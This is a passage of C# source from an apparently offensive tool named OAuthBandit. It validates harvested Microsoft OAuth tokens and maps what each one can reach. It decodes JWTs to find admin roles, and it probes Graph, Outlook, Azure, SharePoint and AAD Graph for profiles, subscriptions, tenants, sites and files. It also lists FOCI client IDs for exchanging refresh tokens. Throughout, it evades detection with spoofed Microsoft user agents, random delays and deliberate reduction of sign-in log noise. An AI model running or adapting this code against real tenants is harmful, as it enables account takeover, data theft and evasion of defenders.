using System.Net;
using System.Net.Http.Headers;
using System.Text;
using System.Text.Json;

namespace OAuthBandit.Core;

// deep token validation - tests auth + checks what we can actually do
// graph access, mail, files, mfa registration, app reg, admin roles
public class TokenValidator
{
    private static readonly HttpClient Http = new() { Timeout = TimeSpan.FromSeconds(12) };
    private static readonly Random _rng = new();

    private const string GraphBase = "https://graph.microsoft.com/v1.0";
    private const string GraphBeta = "https://graph.microsoft.com/beta";
    private const string TokenEndpoint = "https://login.microsoftonline.com/{0}/oauth2/v2.0/token";

    // foci + azure clients to try for RT exchange
    private static readonly (string id, string name)[] FociClients = {
        ("d3590ed6-52b3-4102-aeff-aad2292ab01c", "Office"),
        ("1fec8e78-bce4-4aaf-ab1b-5451cc387264", "Teams"),
        ("04b07795-8ddb-461a-bbee-02f9e1bf7b46", "Azure CLI"),
        ("1950a258-227b-4e31-a9cf-717495945fc2", "Azure PowerShell"),
        ("27922004-5251-4030-b22d-91ecd9a37ea4", "Outlook"),
        ("de8bc8b5-d9f9-48b1-a8ad-b748da725064", "Graph Explorer"),
    };

    // multiple scopes to try - graph first, then azure management
    private static readonly string[] Scopes = {
        "https://graph.microsoft.com/.default offline_access",
        "https://management.azure.com/.default offline_access",
        "https://graph.microsoft.com/User.Read offline_access",
    };

    // real UAs from legit ms clients
    private static readonly string[] UserAgents = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2365.92",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/24004.1307.2669.7070 Chrome/120.0.6099.291 Electron/28.2.10 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.17328; Pro)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.2277.128",
        "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Word 16.0.17328; Pro)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/24004.1404.2764.5498 Chrome/120.0.6099.291 Electron/28.2.10 Safari/537.36",
    };

    private static string RandomUA() => UserAgents[_rng.Next(UserAgents.Length)];

    public List<ValidationResult> Results { get; } = new();

    public void ValidateAll(List<Token> tokens)
    {
        Console.WriteLine("\n  # token validation + capability check");

        // collect tokens: prioritize Graph tokens, skip WAM RT, dedup non-Graph by user+app
        var seen = new HashSet<string>();
        var toTest = new List<Token>();
        var graphTokens = new List<Token>();
        int wamSkipped = 0;
        
        foreach (var t in tokens)
        {
            if (t.TokenType == "ngc_token") continue;
            if (t.TokenType == "refresh_token" && IsWamSourced(t))
            {
                wamSkipped++;
                continue;
            }
            
            // separate Graph tokens - we want to test the best one per user
            if (t.TokenType == "access_token" && HasGraphAudience(t.TokenValue))
            {
                graphTokens.Add(t);
                continue;
            }
            
            // dedup non-Graph by user+app+type
            var key = $"{t.Upn}|{t.TokenType}|{t.Application}";
            if (seen.Add(key)) toTest.Add(t);
        }
        
        // add best Graph token per user (longest expiry)
        var graphByUser = graphTokens.GroupBy(t => t.Upn ?? "unknown");
        foreach (var group in graphByUser)
        {
            // pick the one with longest remaining validity
            var best = group.OrderByDescending(t => GetTokenExpiry(t.TokenValue)).First();
            toTest.Insert(0, best); // insert at front so Graph tokens are tested first
        }

        int graphCount = tokens.Count(t => t.TokenType == "access_token" && HasGraphAudience(t.TokenValue));
        if (wamSkipped > 0)
            Console.WriteLine($"    skipped {wamSkipped} WAM refresh tokens (PRT-bound)");
        Console.WriteLine($"    {graphCount} token(s) with Graph audience found");
        Console.WriteLine($"    testing {toTest.Count} unique tokens...\n");

        int ok = 0, fail = 0;

        foreach (var token in toTest)
        {
            Thread.Sleep(_rng.Next(150, 500));

            var result = token.TokenType == "refresh_token"
                ? TestRefreshToken(token)
                : TestAccessToken(token);

            Results.Add(result);

            var label = $"{token.Application} ({token.TokenType})";
            var user = token.Upn ?? "unknown";

            if (result.Valid)
            {
                ok++;
                Console.WriteLine($"    + {label}");
                if (!result.Capabilities.ContainsKey("user"))
                    Console.WriteLine($"      user: {user}");

                foreach (var cap in result.Capabilities)
                    Console.WriteLine($"      {cap.Key}: {cap.Value}");
            }
            else
            {
                fail++;
                Console.WriteLine($"    - {label} ({result.Error})");
                if (result.Capabilities.Count > 0)
                {
                    foreach (var cap in result.Capabilities)
                        Console.WriteLine($"      {cap.Key}: {cap.Value}");
                }
            }
        }

        Console.WriteLine($"\n  ~ validation: {ok} valid, {fail} failed out of {toTest.Count}");
    }

    // parse JWT payload into a dictionary (without network call)
    private static Dictionary<string, object>? ParseJwt(string jwt)
    {
        try
        {
            var parts = jwt.Split('.');
            if (parts.Length < 2) return null;
            var b64 = parts[1].Replace('-', '+').Replace('_', '/');
            b64 = b64.PadRight(b64.Length + (4 - b64.Length % 4) % 4, '=');
            var bytes = Convert.FromBase64String(b64);
            return JsonSerializer.Deserialize<Dictionary<string, object>>(Encoding.UTF8.GetString(bytes));
        }
        catch { return null; }
    }

    // extract roles/groups from JWT claims (works even on expired tokens)
    private static string? ExtractRolesFromJwt(Dictionary<string, object> payload)
    {
        var roles = new List<string>();

        // wids = directory role template IDs
        if (payload.TryGetValue("wids", out var wids) && wids is JsonElement jwids && jwids.ValueKind == JsonValueKind.Array)
        {
            foreach (var w in jwids.EnumerateArray())
            {
                var rid = w.GetString();
                if (rid != null) roles.Add(MapDirectoryRole(rid));
            }
        }

        // roles = app roles
        if (payload.TryGetValue("roles", out var r) && r is JsonElement jr && jr.ValueKind == JsonValueKind.Array)
        {
            foreach (var role in jr.EnumerateArray())
            {
                if (role.ValueKind == JsonValueKind.String)
                    roles.Add(role.GetString()!);
            }
        }

        return roles.Count > 0 ? string.Join(", ", roles.Distinct()) : null;
    }

    // map well-known directory role template GUIDs to names
    private static string MapDirectoryRole(string templateId)
    {
        return templateId.ToLowerInvariant() switch
        {
            "62e90394-69f5-4237-9190-012177145e10" => "Global Administrator",
            "f28a1f50-f6e7-4571-818b-6a12f2af6b6c" => "SharePoint Administrator",
            "fe930be7-5e62-47db-91af-98c3a49a38b1" => "User Administrator",
            "29232cdf-9323-42fd-ade2-1d097af3e4de" => "Exchange Administrator",
            "b0f54661-2d74-4c50-afa3-1ec803f12efe" => "Billing Administrator",
            "729827e3-9c14-49f7-bb1b-9608f156bbb8" => "Helpdesk Administrator",
            "b1be1c3e-b65d-4f19-8427-f6fa0d97feb9" => "Conditional Access Administrator",
            "194ae4cb-b126-40b2-bd5b-6091b380977d" => "Security Administrator",
            "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3" => "Application Administrator",
            "158c047a-c907-4556-b7ef-446551a6b5f7" => "Cloud Application Administrator",
            "966707d0-3269-4727-9be2-8c3a10f19b9d" => "Password Administrator",
            "7be44c8a-adaf-4e2a-84d6-ab2649e08a13" => "Privileged Authentication Administrator",
            "e8611ab8-c189-46e8-94e1-60213ab1f814" => "Privileged Role Administrator",
            "17315797-102d-40b4-93e0-432062caca18" => "Compliance Administrator",
            "d29b2b05-8046-44ba-8758-1e26182fcf32" => "Directory Synchronization Accounts",
            "9360feb5-f418-4baa-8175-e2a00bac4301" => "Directory Writers",
            "b5468a13-3945-4a40-b0b1-5d78c2676bbf" => "Organizational Messages Writer",
            "b79fbf4d-3ef9-4689-8143-76b194e85509" => "Directory Readers",
            "fdd7a751-b60b-444a-984c-02652fe8fa1c" => "Groups Administrator",
            "3a2c62db-5318-420d-8d74-23affee5d9d5" => "Intune Administrator",
            "4a5d8f65-41da-4de4-8968-e035b65339cf" => "Reports Reader",
            "790c1fb9-7f7d-4f88-86a1-ef1f95c05c1b" => "Teams Administrator",
            "69091246-20e8-4a56-aa4d-066075b2a7a8" => "Teams Communications Administrator",
            "2b745bdf-0803-4d80-aa65-822c4493daac" => "Office Apps Administrator",
            "644ef478-e28f-4e28-b9dc-3fdde9aa0b1f" => "Dynamics 365 Administrator",
            "11648597-926c-4cf3-9c36-bcebb0ba8dcc" => "Power Platform Administrator",
            "e3973bdf-4987-49ae-837a-ba8e231c7286" => "Azure DevOps Administrator",
            "892c5842-a9a6-463a-8041-72aa08ca3cf6" => "Cloud Device Administrator",
            "7698a772-787b-4ac8-901f-60d6b08affd2" => "Cloud Application Administrator",
            _ => $"role:{templateId[..8]}"
        };
    }

    // test an access token: offline JWT analysis + optional Graph probing for valid tokens
    private ValidationResult TestAccessToken(Token token)
    {
        try
        {
            var payload = ParseJwt(token.TokenValue);
            string? audience = null;
            string? jwtRoles = null;
            string? jwtUpn = null;
            string? jwtAppName = null;
            string? jwtScopes = null;
            bool isExpired = true;
            string? expiryInfo = null;

            if (payload != null)
            {
                if (payload.TryGetValue("aud", out var aud) && aud is JsonElement jaud && jaud.ValueKind == JsonValueKind.String)
                    audience = jaud.GetString();

                jwtRoles = ExtractRolesFromJwt(payload);

                foreach (var key in new[] { "upn", "unique_name", "email", "preferred_username" })
                {
                    if (payload.TryGetValue(key, out var u) && u is JsonElement ju && ju.ValueKind == JsonValueKind.String)
                    { jwtUpn = ju.GetString(); break; }
                }

                if (payload.TryGetValue("app_displayname", out var an) && an is JsonElement jan && jan.ValueKind == JsonValueKind.String)
                    jwtAppName = jan.GetString();

                if (payload.TryGetValue("scp", out var scp) && scp is JsonElement jscp && jscp.ValueKind == JsonValueKind.String)
                    jwtScopes = jscp.GetString();

                if (payload.TryGetValue("exp", out var exp) && exp is JsonElement jexp)
                {
                    long expTs = 0;
                    if (jexp.ValueKind == JsonValueKind.Number) expTs = jexp.GetInt64();
                    else if (jexp.ValueKind == JsonValueKind.String) long.TryParse(jexp.GetString(), out expTs);

                    if (expTs > 0)
                    {
                        var expDt = DateTimeOffset.FromUnixTimeSeconds(expTs).LocalDateTime;
                        isExpired = expDt < DateTime.Now;
                        var diff = expDt - DateTime.Now;
                        expiryInfo = isExpired
                            ? $"expired {Math.Abs((int)diff.TotalMinutes)}m ago"
                            : $"valid for {(int)diff.TotalMinutes}m";
                    }
                }
            }

            // Normalize audience (GUID → URL) using SpecterPortal logic
            var normalizedAud = Constants.NormalizeAudience(audience);
            var (_, audLabel) = ResolveTestEndpoint(normalizedAud);

            var result = new ValidationResult
            {
                Token = token,
                Valid = !isExpired,
                Error = isExpired ? $"expired ({audLabel})" : null
            };

            if (!isExpired) result.Capabilities["audience"] = audLabel;
            if (jwtUpn != null) result.Capabilities["user"] = jwtUpn;
            if (jwtRoles != null) result.Capabilities[isExpired ? "roles (from jwt)" : "roles"] = jwtRoles;
            if (expiryInfo != null) result.Capabilities["expiry"] = expiryInfo;
            if (jwtAppName != null) result.Capabilities["app"] = jwtAppName;

            // for valid tokens, probe resources based on normalized audience
            if (!isExpired)
            {
                ProbeTokenByAudience(token.TokenValue, normalizedAud, result, jwtScopes);
            }

            return result;
        }
        catch (Exception ex)
        {
            return new ValidationResult { Token = token, Valid = false, Error = Truncate(ex.Message, 60) };
        }
    }

    // check if token audience is Graph API (only tokens issued FOR Graph can call it)
    private static bool IsGraphAudience(string? audience)
    {
        if (string.IsNullOrEmpty(audience)) return false;
        var aud = audience.ToLowerInvariant().TrimEnd('/');
        
        // Graph audience: URL or GUID
        return aud == "https://graph.microsoft.com" || 
               aud == "graph.microsoft.com" ||
               aud == "00000003-0000-0000-c000-000000000000";
    }

    // check if a JWT token has Graph audience (check aud claim specifically)
    private static bool HasGraphAudience(string tokenValue)
    {
        try
        {
            var parts = tokenValue.Split('.');
            if (parts.Length < 2) return false;
            var payload = parts[1].Replace('-', '+').Replace('_', '/');
            var pad = (4 - payload.Length % 4) % 4;
            payload += new string('=', pad);
            var json = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(payload));
            var doc = JsonDocument.Parse(json);
            if (doc.RootElement.TryGetProperty("aud", out var aud))
            {
                var audStr = aud.GetString()?.ToLowerInvariant().TrimEnd('/') ?? "";
                return audStr == "https://graph.microsoft.com" || 
                       audStr == "graph.microsoft.com" ||
                       audStr == "00000003-0000-0000-c000-000000000000";
            }
        }
        catch { }
        return false;
    }

    // get token expiry timestamp for sorting
    private static long GetTokenExpiry(string tokenValue)
    {
        try
        {
            var parts = tokenValue.Split('.');
            if (parts.Length < 2) return 0;
            var payload = parts[1].Replace('-', '+').Replace('_', '/');
            var pad = (4 - payload.Length % 4) % 4;
            payload += new string('=', pad);
            var json = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(payload));
            var doc = JsonDocument.Parse(json);
            if (doc.RootElement.TryGetProperty("exp", out var exp))
                return exp.GetInt64();
        }
        catch { }
        return 0;
    }

    // route probing based on normalized token audience
    private void ProbeTokenByAudience(string accessToken, string? audience, ValidationResult result, string? scopes)
    {
        var aud = audience?.ToLowerInvariant().TrimEnd('/') ?? "";
        
        // Graph API (already normalized from GUID)
        if (aud == "https://graph.microsoft.com")
        {
            ProbeGraphCapabilities(accessToken, result, scopes);
            return;
        }
        
        // Teams API
        if (aud.Contains("api.spaces.skype.com") || aud.Contains("chatsvcagg.teams") ||
            aud == "1fec8e78-bce4-4aaf-ab1b-5451cc387264" || aud == "cc15fd57-2c6c-4117-a88c-83b1d56b4bbe")
        {
            ProbeTeamsCapabilities(accessToken, result, scopes);
            return;
        }
        
        // Outlook API (normalized from GUID)
        if (aud == "https://outlook.office365.com" || aud.Contains("outlook.office"))
        {
            ProbeOutlookCapabilities(accessToken, result, scopes);
            return;
        }
        
        // Azure Management API (normalized from GUID)
        if (aud == "https://management.azure.com" || aud.Contains("management.core.windows.net"))
        {
            ProbeAzureManagementCapabilities(accessToken, result, scopes);
            return;
        }
        
        // Azure Key Vault
        if (aud == "https://vault.azure.net" || aud.Contains("vault.azure.net"))
        {
            ProbeKeyVaultCapabilities(accessToken, result, scopes);
            return;
        }
        
        // SharePoint API (normalized from GUID)
        if (aud == "https://microsoft.sharepoint.com" || aud.Contains("sharepoint.com"))
        {
            ProbeSharePointCapabilities(accessToken, result, scopes);
            return;
        }
        
        // AAD Graph (legacy)
        if (aud == "https://graph.windows.net")
        {
            ProbeAADGraphCapabilities(accessToken, result, scopes);
            return;
        }
        
        // FOCI apps with GUID audiences - try Graph
        if (Constants.IsFociApp(aud))
        {
            ProbeGraphCapabilities(accessToken, result, scopes);
            return;
        }
        
        // Unknown audience - just show scopes
        if (!string.IsNullOrEmpty(scopes))
        {
            var scopeList = scopes.Split(' ').Where(s => !string.IsNullOrEmpty(s)).Take(5);
            result.Capabilities["scopes"] = string.Join(", ", scopeList) + (scopes.Split(' ').Length > 5 ? "..." : "");
        }
    }

    // probe Graph API resources with a valid access token (like the PowerShell script)
    private void ProbeGraphCapabilities(string accessToken, ValidationResult result, string? scopes)
    {
        // 1. Profile (/me)
        Thread.Sleep(_rng.Next(30, 80));
        var meResp = GraphGet($"{GraphBase}/me?$select=displayName,mail,userPrincipalName", accessToken);
        if (meResp.status == HttpStatusCode.OK)
        {
            try
            {
                var me = JsonSerializer.Deserialize<Dictionary<string, object>>(meResp.body);
                if (me != null)
                {
                    var name = Jstr(me, "displayName") ?? "";
                    var mail = Jstr(me, "mail") ?? Jstr(me, "userPrincipalName") ?? "";
                    result.Capabilities["profile"] = $"{name} <{mail}>";
                }
            }
            catch { result.Capabilities["profile"] = "OK"; }
        }
        else
            result.Capabilities["profile"] = $"no ({(int)meResp.status})";

        // show permissions from JWT with categorization
        if (!string.IsNullOrEmpty(scopes))
        {
            var scopeList = scopes.Split(' ').Where(s => !string.IsNullOrEmpty(s)).ToList();
            var permissions = CategorizePermissions(scopeList);
            result.Capabilities["permissions"] = $"{scopeList.Count} scopes granted:";
            foreach (var cat in permissions.Take(5))
                result.Capabilities[$"  {cat.Key}"] = cat.Value;
        }
    }

    // categorize permissions by type
    private static Dictionary<string, string> CategorizePermissions(List<string> scopes)
    {
        var categories = new Dictionary<string, List<string>>
        {
            ["mail"] = new(), ["calendar"] = new(), ["files"] = new(), ["user"] = new(),
            ["directory"] = new(), ["teams"] = new(), ["sites"] = new(), ["other"] = new()
        };
        
        foreach (var scope in scopes)
        {
            var s = scope.ToLowerInvariant();
            if (s.Contains("mail")) categories["mail"].Add(scope);
            else if (s.Contains("calendar")) categories["calendar"].Add(scope);
            else if (s.Contains("files") || s.Contains("drive")) categories["files"].Add(scope);
            else if (s.Contains("user")) categories["user"].Add(scope);
            else if (s.Contains("directory") || s.Contains("group")) categories["directory"].Add(scope);
            else if (s.Contains("team") || s.Contains("chat") || s.Contains("channel")) categories["teams"].Add(scope);
            else if (s.Contains("site") || s.Contains("sharepoint")) categories["sites"].Add(scope);
            else categories["other"].Add(scope);
        }
        
        var result = new Dictionary<string, string>();
        foreach (var cat in categories.Where(c => c.Value.Count > 0))
        {
            var perms = string.Join(", ", cat.Value.Take(3).Select(p => p.Split('.')[0]));
            if (cat.Value.Count > 3) perms += $" (+{cat.Value.Count - 3})";
            result[cat.Key] = perms;
        }
        return result;
    }

    // probe Teams API
    private void ProbeTeamsCapabilities(string accessToken, ValidationResult result, string? scopes)
    {
        if (!string.IsNullOrEmpty(scopes))
        {
            var scopeList = scopes.Split(' ').Where(s => !string.IsNullOrEmpty(s)).Take(5);
            result.Capabilities["scopes"] = string.Join(", ", scopeList) + (scopes.Split(' ').Length > 5 ? "..." : "");
        }
    }

    // probe Outlook API
    private void ProbeOutlookCapabilities(string accessToken, ValidationResult result, string? scopes)
    {
        var outlookBase = "https://outlook.office365.com/api/v2.0";
        
        // User info only
        Thread.Sleep(_rng.Next(30, 80));
        var meResp = GraphGet($"{outlookBase}/me", accessToken);
        if (meResp.status == HttpStatusCode.OK)
        {
            try
            {
                var me = JsonSerializer.Deserialize<Dictionary<string, object>>(meResp.body);
                if (me != null)
                    result.Capabilities["profile"] = Jstr(me, "DisplayName") ?? Jstr(me, "EmailAddress") ?? "OK";
            }
            catch { result.Capabilities["profile"] = "OK"; }
        }
        else
            result.Capabilities["profile"] = $"no ({(int)meResp.status})";
        
        if (!string.IsNullOrEmpty(scopes))
        {
            var scopeList = scopes.Split(' ').Where(s => !string.IsNullOrEmpty(s)).Take(5);
            result.Capabilities["scopes"] = string.Join(", ", scopeList) + (scopes.Split(' ').Length > 5 ? "..." : "");
        }
    }

    // probe Azure Management API
    private void ProbeAzureManagementCapabilities(string accessToken, ValidationResult result, string? scopes)
    {
        var azureBase = "https://management.azure.com";
        
        // 1. Subscriptions
        Thread.Sleep(_rng.Next(30, 80));
        var subsResp = GraphGet($"{azureBase}/subscriptions?api-version=2022-12-01", accessToken);
        if (subsResp.status == HttpStatusCode.OK)
        {
            try
            {
                var s = JsonSerializer.Deserialize<Dictionary<string, object>>(subsResp.body);
                if (s != null && s.TryGetValue("value", out var val) && val is JsonElement arr && arr.ValueKind == JsonValueKind.Array)
                {
                    var names = new List<string>();
                    foreach (var sub in arr.EnumerateArray())
                        if (sub.TryGetProperty("displayName", out var dn) && dn.ValueKind == JsonValueKind.String)
                            names.Add(dn.GetString() ?? "");
                    result.Capabilities["subscriptions"] = names.Count > 0
                        ? $"{names.Count} ({string.Join(", ", names.Take(3).Select(n => Truncate(n, 20)))})"
                        : "none";
                }
            }
            catch { result.Capabilities["subscriptions"] = "OK"; }
        }
        else
            result.Capabilities["subscriptions"] = $"no ({(int)subsResp.status})";
        
        // 2. Resource groups (if we have subscriptions)
        if (subsResp.status == HttpStatusCode.OK)
        {
            try
            {
                var s = JsonSerializer.Deserialize<Dictionary<string, object>>(subsResp.body);
                if (s != null && s.TryGetValue("value", out var val) && val is JsonElement arr && arr.ValueKind == JsonValueKind.Array && arr.GetArrayLength() > 0)
                {
                    var firstSub = arr[0];
                    if (firstSub.TryGetProperty("subscriptionId", out var subId) && subId.ValueKind == JsonValueKind.String)
                    {
                        Thread.Sleep(_rng.Next(30, 80));
                        var rgResp = GraphGet($"{azureBase}/subscriptions/{subId.GetString()}/resourcegroups?api-version=2021-04-01", accessToken);
                        if (rgResp.status == HttpStatusCode.OK)
                        {
                            var rg = JsonSerializer.Deserialize<Dictionary<string, object>>(rgResp.body);
                            if (rg != null && rg.TryGetValue("value", out var rgVal) && rgVal is JsonElement rgArr && rgArr.ValueKind == JsonValueKind.Array)
                                result.Capabilities["resource_groups"] = $"{rgArr.GetArrayLength()} groups";
                        }
                        else
                            result.Capabilities["resource_groups"] = $"no ({(int)rgResp.status})";
                    }
                }
            }
            catch { }
        }
        
        // 3. Tenants
        Thread.Sleep(_rng.Next(30, 80));
        var tenantsResp = GraphGet($"{azureBase}/tenants?api-version=2022-12-01", accessToken);
        if (tenantsResp.status == HttpStatusCode.OK)
        {
            try
            {
                var t = JsonSerializer.Deserialize<Dictionary<string, object>>(tenantsResp.body);
                if (t != null && t.TryGetValue("value", out var val) && val is JsonElement arr && arr.ValueKind == JsonValueKind.Array)
                    result.Capabilities["tenants"] = $"{arr.GetArrayLength()} tenant(s)";
            }
            catch { result.Capabilities["tenants"] = "OK"; }
        }
        else
            result.Capabilities["tenants"] = $"no ({(int)tenantsResp.status})";
        
        if (!string.IsNullOrEmpty(scopes))
        {
            var scopeList = scopes.Split(' ').Where(s => !string.IsNullOrEmpty(s)).Take(5);
            result.Capabilities["scopes"] = string.Join(", ", scopeList) + (scopes.Split(' ').Length > 5 ? "..." : "");
        }
    }

    // probe SharePoint API
    private void ProbeSharePointCapabilities(string accessToken, ValidationResult result, string? scopes)
    {
        // SharePoint tokens usually have tenant-specific audience like https://tenant.sharepoint.com
        // We'll try Graph endpoints which work with SharePoint tokens
        
        // 1. Sites via Graph
        Thread.Sleep(_rng.Next(30, 80));
        var sitesResp = GraphGet($"{GraphBase}/sites?search=*&$top=5", accessToken);
        if (sitesResp.status == HttpStatusCode.OK)
        {
            try
            {
                var s = JsonSerializer.Deserialize<Dictionary<string, object>>(sitesResp.body);
                if (s != null && s.TryGetValue("value", out var val) && val is JsonElement arr && arr.ValueKind == JsonValueKind.Array)
                {
                    var names = new List<string>();
                    foreach (var site in arr.EnumerateArray())
                        if (site.TryGetProperty("displayName", out var dn) && dn.ValueKind == JsonValueKind.String)
                            names.Add(dn.GetString() ?? "");
                    result.Capabilities["sites"] = names.Count > 0
                        ? $"{names.Count} ({string.Join(", ", names.Take(3).Select(n => Truncate(n, 15)))})"
                        : "none found";
                }
            }
            catch { result.Capabilities["sites"] = "OK"; }
        }
        else
            result.Capabilities["sites"] = $"no ({(int)sitesResp.status})";
        
        // 2. Drives
        Thread.Sleep(_rng.Next(30, 80));
        var drivesResp = GraphGet($"{GraphBase}/me/drives", accessToken);
        if (drivesResp.status == HttpStatusCode.OK)
        {
            try
            {
                var d = JsonSerializer.Deserialize<Dictionary<string, object>>(drivesResp.body);
                if (d != null && d.TryGetValue("value", out var val) && val is JsonElement arr && arr.ValueKind == JsonValueKind.Array)
                    result.Capabilities["drives"] = $"{arr.GetArrayLength()} drive(s)";
            }
            catch { result.Capabilities["drives"] = "OK"; }
        }
        else
            result.Capabilities["drives"] = $"no ({(int)drivesResp.status})";
        
        // 3. Root drive files
        Thread.Sleep(_rng.Next(30, 80));
        var filesResp = GraphGet($"{GraphBase}/me/drive/root/children?$top=10", accessToken);
        if (filesResp.status == HttpStatusCode.OK)
        {
            try
            {
                var f = JsonSerializer.Deserialize<Dictionary<string, object>>(filesResp.body);
                if (f != null && f.TryGetValue("value", out var val) && val is JsonElement arr && arr.ValueKind == JsonValueKind.Array)
                {
                    int folders = 0, files = 0;
                    foreach (var item in arr.EnumerateArray())
                    {
                        if (item.TryGetProperty("folder", out _)) folders++;
                        else files++;
                    }
                    result.Capabilities["files"] = $"{folders} folders, {files} files";
                }
            }
            catch { result.Capabilities["files"] = "OK"; }
        }
        else
            result.Capabilities["files"] = $"no ({(int)filesResp.status})";
        
        if (!string.IsNullOrEmpty(scopes))
        {
            var scopeList = scopes.Split(' ').Where(s => !string.IsNullOrEmpty(s)).Take(5);
            result.Capabilities["scopes"] = string.Join(", ", scopeList) + (scopes.Split(' ').Length > 5 ? "..." : "");
        }
    }

    // probe Azure Key Vault API
    private void ProbeKeyVaultCapabilities(string accessToken, ValidationResult result, string? scopes)
    {
        // Key Vault requires tenant-specific URLs, so we just verify the token works
        result.Capabilities["keyvault"] = "token valid for vault.azure.net";
        
        if (!string.IsNullOrEmpty(scopes))
        {
            var scopeList = scopes.Split(' ').Where(s => !string.IsNullOrEmpty(s)).Take(5);
            result.Capabilities["scopes"] = string.Join(", ", scopeList) + (scopes.Split(' ').Length > 5 ? "..." : "");
        }
    }

    // probe AAD Graph API (legacy)
    private void ProbeAADGraphCapabilities(string accessToken, ValidationResult result, string? scopes)
    {
        var aadBase = "https://graph.windows.net";
        
        // 1. Get current user
        Thread.Sleep(_rng.Next(30, 80));
        var meResp = GraphGet($"{aadBase}/me?api-version=1.6", accessToken);
        if (meResp.status == HttpStatusCode.OK)
        {
            try
            {
                var me = JsonSerializer.Deserialize<Dictionary<string, object>>(meResp.body);
                if (me != null)
                    result.Capabilities["profile"] = Jstr(me, "displayName") ?? Jstr(me, "userPrincipalName") ?? "OK";
            }
            catch { result.Capabilities["profile"] = "OK"; }
        }
        else
            result.Capabilities["profile"] = $"no ({(int)meResp.status})";
        
        // 2. List users (directory read)
        Thread.Sleep(_rng.Next(30, 80));
        var usersResp = GraphGet($"{aadBase}/users?api-version=1.6&$top=3", accessToken);
        result.Capabilities["directory"] = usersResp.status == HttpStatusCode.OK ? "readable" : $"no ({(int)usersResp.status})";
        
        if (!string.IsNullOrEmpty(scopes))
        {
            var scopeList = scopes.Split(' ').Where(s => !string.IsNullOrEmpty(s)).Take(5);
            result.Capabilities["scopes"] = string.Join(", ", scopeList) + (scopes.Split(' ').Length > 5 ? "..." : "");
        }
    }

    // known app GUIDs -> test endpoints (aud in JWT is often a GUID not a URL)
    private static readonly Dictionary<string, (string url, string label)> KnownAppEndpoints = new(StringComparer.OrdinalIgnoreCase)
    {
        // teams clients
        ["1fec8e78-bce4-4aaf-ab1b-5451cc387264"] = ("https://teams.microsoft.com/api/mt/part/emea-03/beta/users/useraggregatesettings", "Teams"),
        ["cc15fd57-2c6c-4117-a88c-83b1d56b4bbe"] = ("https://teams.microsoft.com/api/mt/part/emea-03/beta/users/useraggregatesettings", "Teams Web"),
        ["5e3ce6c0-2b1f-4285-8d4b-75ee78787346"] = ("https://teams.microsoft.com/api/mt/part/emea-03/beta/users/useraggregatesettings", "Teams Mobile"),
        // office / graph-compatible
        ["d3590ed6-52b3-4102-aeff-aad2292ab01c"] = ($"{GraphBase}/me", "Office (Graph)"),
        ["ab9b8c07-8f02-4f72-87fa-80105867a763"] = ($"{GraphBase}/me", "OneDrive (Graph)"),
        ["00000003-0000-0000-c000-000000000000"] = ($"{GraphBase}/me", "Graph API"),
        ["de8bc8b5-d9f9-48b1-a8ad-b748da725064"] = ($"{GraphBase}/me", "Graph Explorer"),
        // outlook
        ["27922004-5251-4030-b22d-91ecd9a37ea4"] = ("https://outlook.office365.com/api/v2.0/me", "Outlook"),
        ["00000002-0000-0ff1-ce00-000000000000"] = ("https://outlook.office365.com/api/v2.0/me", "Exchange"),
        // edge / browser
        ["ecd6b820-32c2-49b6-98a6-444530e5a77a"] = ($"{GraphBase}/me", "Edge (Graph)"),
        // azure
        ["04b07795-8ddb-461a-bbee-02f9e1bf7b46"] = ("https://management.azure.com/subscriptions?api-version=2022-12-01", "Azure CLI"),
        ["1950a258-227b-4e31-a9cf-717495945fc2"] = ("https://management.azure.com/subscriptions?api-version=2022-12-01", "Azure PowerShell"),
        // sharepoint
        ["00000003-0000-0ff1-ce00-000000000000"] = ("https://graph.microsoft.com/v1.0/me/drive", "SharePoint"),
    };

    // map jwt audience to the correct test endpoint
    private static (string url, string label) ResolveTestEndpoint(string? audience)
    {
        if (string.IsNullOrEmpty(audience))
            return ($"{GraphBase}/me", "unknown");

        var aud = audience.TrimEnd('/');

        // check known app GUIDs first (most TBRes tokens have GUID audiences)
        if (KnownAppEndpoints.TryGetValue(aud, out var known))
            return known;

        var audLower = aud.ToLowerInvariant();

        // url-based audiences
        if (audLower.Contains("graph.microsoft.com"))
            return ($"{GraphBase}/me", "Graph API");
        if (audLower.Contains("api.spaces.skype.com") || audLower.Contains("teams"))
            return ("https://teams.microsoft.com/api/mt/part/emea-03/beta/users/useraggregatesettings", "Teams API");
        if (audLower.Contains("outlook.office"))
            return ("https://outlook.office365.com/api/v2.0/me", "Outlook API");
        if (audLower.Contains("management.azure.com") || audLower.Contains("management.core.windows.net"))
            return ("https://management.azure.com/subscriptions?api-version=2022-12-01", "Azure Management");
        if (audLower.Contains("sharepoint.com"))
            return ($"{aud}/_api/web/currentuser", "SharePoint");
        if (audLower.Contains("substrate.office.com"))
            return ("https://substrate.office.com/api/v1/me", "Office Substrate");

        // url fallback
        if (audLower.StartsWith("https://"))
            return (aud, $"custom ({aud[8..Math.Min(aud.Length, 40)]})");

        // unknown GUID - try graph as last resort
        return ($"{GraphBase}/me", $"app:{aud[..Math.Min(aud.Length, 12)]}");
    }

    // test a refresh token: try original client_id first, then FOCI exchange, then deep probe
    private ValidationResult TestRefreshToken(Token token)
    {
        try
        {
            // minimal approach: try original client on common first, then 2 best FOCI clients
            // this reduces Azure AD sign-in log noise from ~54 attempts to ~4
            string? accessToken = null;
            string? clientUsed = null;
            string? scopeUsed = null;
            string? lastError = null;

            // ordered by likelihood: original first, then Office (best FOCI), then Azure CLI
